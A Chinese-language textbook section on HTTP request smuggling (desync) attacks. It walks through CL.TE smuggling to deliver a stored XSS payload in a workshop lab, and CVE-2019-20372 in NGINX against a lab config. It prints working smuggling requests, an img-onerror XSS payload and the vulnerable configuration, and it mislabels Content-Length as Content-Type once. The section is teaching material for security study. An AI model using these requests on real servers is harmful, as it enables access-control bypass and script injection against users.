
## 9.6 HTTP 请求走私/HTTP 失同步攻击

Web 基础设施包含各种组件，包括 WAF、反向代理、Web 服务器和负载均衡器。当应用程序收到请求时，它将通过各种组件处理，这些组件可能会根据其逻辑以不同方式解释请求，从而导致意外行为；其中一种行为是请求走私。

HTTP 请求走私，也称为 HTTP 失同步攻击，是一类漏洞，通常通过发送模糊的 HTTP 请求来利用，该请求将被前端服务器（如反向代理、负载均衡器等）视为一个 HTTP 请求，而后端 Web 服务器将其视为多个请求。这是通过使用 `Content-Type`（CT）和 `Transfer-Encoding`（TE）标头实现的。后果可能从 XSS、缓存投毒到绕过安全控制，具体取决于环境的细节。

在 HTTP 请求中，这些标头用于通知 Web 服务器请求结束的位置。例如，CT 标头会通知 Web 服务器正文的长度（以字节为单位）。以下是一个示例：

**请求**
```
POST /data HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

data=tmgm1
```

TE 标头的值为 `chunked`，表示请求正文以块的形式发送。以下是一个示例：

**请求**
```
POST /data HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

6
data=tmgm1
0
```

除了标头之外，块的大小为 6（十六进制），后跟数据 `data=tmgm1`。请求以大小为 0 的块结束，向后端服务器指示不再发送更多数据。

在 HTTP/1.1 中，可以在一个请求中包含 `Content-Length`（CL）和 TE 标头。这可能导致不明确的行为。根据 HTTP/1.1 规范，如果同时存在两个标头，则 TE 标头应优先，而 CL 标头应被忽略。然而，前端和后端服务器可能不遵守此规范，并可能优先考虑 CL 而不是 TE。这构成了 HTTP 请求走私攻击的基础。

例如，前端组件可能依赖 CL 来确定请求的结束，而后端使用 TE，反之亦然。

有了这些概念，让我们探讨几个示例。

### 9.6.1 CL.TE 技术导致持久型 XSS

为了说明，让我们看一个易受 HTTP 请求走私攻击的应用程序 [https://gosecure.github.io/request-smuggling-workshop/#4]。在此场景中，代理使用 CL 标头确定请求的结束，而后端服务器（本例中为 NGINX）优先考虑 TE 标头。

#### 9.6.1.1 验证漏洞

为了测试此漏洞，我们将使用以下请求：

**请求**
```
POST / HTTP/1.1
Host: localhost
Content-Length: 6
Transfer-Encoding: chunked

0

A
```

以下是请求的分解：

- CL 标头指示正文长度为 6 字节。
- TE 标头为 `chunked`，第一个块的大小为 0 字节。
- 大小后的“A”将被后端服务器视为新请求。

由于处理这些标头的差异，代理服务器将看到 CL 标头，并断定整个请求正文只有 6 字节长。因此，将请求转发给后端服务器（NGNIX），另一方面，NGINX 服务器将查看“TE”标头，并将消息视为分块消息。它处理第一个块（大小为 0 字节），并将随后的“A”解释为新单独请求的开始。

多次发送此请求后，我们收到“405 Not Allowed”错误。此错误表明 NGINX 服务器已将“A”作为新请求处理；然而，由于它格式错误，它返回此错误。

**图 9.31 成功验证请求走私**

#### 9.6.1.2 识别 XSS

该场景包含一个联系表单，将 `example` 参数作为输入。该参数容易受到 XSS 攻击；然而，由于漏洞存在于查询字符串中，现代浏览器将对请求进行编码。例如，考虑当用户导航到以下 URL 时会发生什么：

**示例**
```
http://localhost/contact.php?example="><img src=x onerror=prompt(1)>
```

这将导致现代浏览器将其编码为：

**示例**
```
http://localhost/contact.php?example=%22%3E%3Cimg%20src%3Dx%20onerror%3Dprompt(1)%3E
```

为了绕过前端防御并将我们的 XSS 有效载荷传送到应用程序，我们可以使用 HTTP 请求走私：

**请求：**
```
POST / HTTP/1.1
Host: localhost
Content-Length: 93
Transfer-Encoding: chunked

0

GET /contact.php?example=1337"><img/src="x"onerror='prompt(document.domain)'> HTTP/1.1
Foo:
```

**图 9.32 确认 XSS 漏洞**

在 HTTP 结果走私发挥作用的情况下，后端服务器（NGINX）会将包含 XSS 有效载荷的请求解释为合法请求，任何随后访问受影响页面（本例中为带有恶意 `example` 参数的 `/contact.php` 页面）的用户都将触发 XSS 有效载荷。

为了确认这一点，在发送成功请求并收到响应后，我们可以立即访问 `https://localhost`，应该会看到有效载荷被执行：

**图 9.33 HTTP 请求走私生效**

通过检查日志，可以确认服务器接收并处理了包含初始走私有效载荷的 POST 请求和包含 XSS 有效载荷的 GET 请求。日志中的双条目清楚表明走私尝试成功，并且后端服务器将走私的 GET 请求视为独立实体。

**图 9.34 日志中的双条目确认漏洞**

### 9.6.2 CVE-2019-20372：NGINX 中通过错误页面的 HTTP 请求走私

CVE-2019-20372 是一个影响 NGINX 1.17.7 之前版本的漏洞。此漏洞源于与 `error_page` 指令相关的特定配置。在 NGINX 前有负载均衡器的环境中，负载均衡器和 NGINX 对传入 HTTP 请求解释的差异可能导致请求走私攻击。

此漏洞的实质是：攻击者旨在构造一个请求，负载均衡器将其视为单个请求，但 NGINX 将其解释为两个单独的请求。因此，允许攻击者绕过访问控制限制并访问未授权的网页。

考虑来自“HTTP-Smuggling-Lab”[https://github.com/ZeddYu/HTTP-Smuggling-Lab/tree/master/nginx] 的一个场景，其中包含易受攻击的 NGINX 版本：

**易受攻击的配置**
```nginx
# 用于 localhost 的第一个服务器块
server {
    listen 80;
    server_name localhost;
    # 将 401 未授权错误重定向到 http://example.org
    error_page 401 http://example.org;
    location / {
        return 401;
    }
}

# 用于 notlocalhost 的第二个服务器块
server {
    listen 80;
    server_name notlocalhost;
    location /_hidden/index.html {
        return 200 'This should be hidden!';
    }
}
```

在此设置中，第一个服务器块配置为“localhost”，并具有一个 `error_page` 指令，当发生 401 错误时重定向到 `http://example.org`。第二个服务器块配置为“notlocalhost”，并包含位于 `/_hidden/index.html` 的隐藏资源。如果 `error_page` 指令指向绝对 URL（如 `http://example.org`），NGINX 会将传入请求的正文视为新的单独请求。

为了确定是否可能进行请求走私，攻击者会尝试通过构造针对“localhost”的请求来访问“notlocalhost”上的隐藏文件。如果成功，NGINX 将处理原始请求和走私请求。

**请求：**
```
GET / HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive

GET /_hidden/index.html HTTP/1.1
Host: notlocalhost
```

**图 9.35 使用请求走私访问隐藏文件**

当 NGINX 收到请求时，它将处理对“localhost”的请求，在此它将遇到 401 错误，并将用户重定向到 `example.org`。然而，对“notlocalhost”的走私请求也将被处理，从而揭示隐藏资源。

请求走私传统上在 HTTP/1.1 中出现，类似的 HTTP/2 攻击在很大程度上是不可行的。这是因为 HTTP/2 将请求/响应结构化为二进制帧，从而避免了 CL 和 TE 标头的不同解释。此外，HTTP/2 不支持“TE”标头，并使用帧长度字段来确定消息大小。

## 9.7 额外进阶

- **自动化 XXE 利用**：探索“xxeserve”工具，了解其功能以及如何利用它来利用 XXE 漏洞 [https://github.com/joernchen/xxeserve]。
- **自动化 SSRF 利用**：探索“ssrfmap”工具，该工具旨在自动检测和利用 SSRF 漏洞 [https://github.com/swisskyrepo/SSRFmap]。
- **HTTP 请求走私**：探索 PortSwigger 提供的 HTTP 请求走私实验室以及 Gosecure 的 HTTP 请求走私工作坊。
- **HTTP 走私降级攻击**：研究 HTTP 走私降级攻击的机制，以及它们如何在现代 Web 应用程序中被滥用。
- **SSRF 圣经和协议走私**：探索 SSRF 圣经，特别注意与协议 SSRF 走私相关的示例。
